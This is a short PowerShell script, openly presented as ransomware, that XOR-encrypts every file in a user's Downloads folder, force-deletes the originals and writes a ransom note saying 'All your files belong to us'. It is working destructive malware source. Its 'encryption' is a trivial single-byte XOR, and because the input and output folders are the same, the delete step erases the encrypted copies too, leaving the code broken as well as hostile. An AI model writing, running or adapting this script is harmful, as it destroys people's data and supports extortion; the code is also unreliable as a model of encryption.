# Set the input and output directory paths and encryption key
$inputDirectory = "C:\Users\kevin\Downloads"  # Replace with your input directory
$outputDirectory = "C:\Users\kevin\Downloads"  # Replace with your output directory
$key = "mysecretkey"  # Replace with your secret key

# Create the ransom note content
$ransomNoteContent = "All your files belong to us`n"
$ransomNoteContent += "       .--.`n"
$ransomNoteContent += "      /.-. '----------.`n"
$ransomNoteContent += "      \-' .--\"\"\"`-`-._`-.`n"
$ransomNoteContent += "       '--'              '-`n"

# Function to encrypt a file using PowerShell
function Encrypt-File {
    param (
        [string]$inputFile,
        [string]$outputFile,
        [string]$key
    )

    $secureKey = ConvertTo-SecureString $key -AsPlainText -Force
    $content = Get-Content -Path $inputFile -Encoding Byte
    $encryptedContent = $content | ForEach-Object { $_ -bxor $secureKey.GetNetworkCredential().Password[0] }
    Set-Content -Path $outputFile -Value $encryptedContent -Encoding Byte
}

# Create the encrypted directory if it doesn't exist
if (!(Test-Path -Path $outputDirectory -PathType Container)) {
    New-Item -Path $outputDirectory -ItemType Directory
}

# Get a list of files in the input directory
$files = Get-ChildItem -Path $inputDirectory

foreach ($file in $files) {
    if ($file.PSIsContainer -eq $false) {  # Check if it's a regular file
        $inputFilePath = $file.FullName
        $outputFilePath = Join-Path -Path $outputDirectory -ChildPath $file.Name

        # Encrypt the file
        Encrypt-File -inputFile $inputFilePath -outputFile $outputFilePath -key $key
        Write-Host "File encrypted: $($file.Name)"

        # Delete the original file after encryption
        Remove-Item -Path $inputFilePath -Force
    }
}

# Create the ransom note file
$ransomNotePath = Join-Path -Path $outputDirectory -ChildPath "ransom_note.txt"
$ransomNoteContent | Set-Content -Path $ransomNotePath

Write-Host "All files in the directory encrypted successfully, ransom note added!"
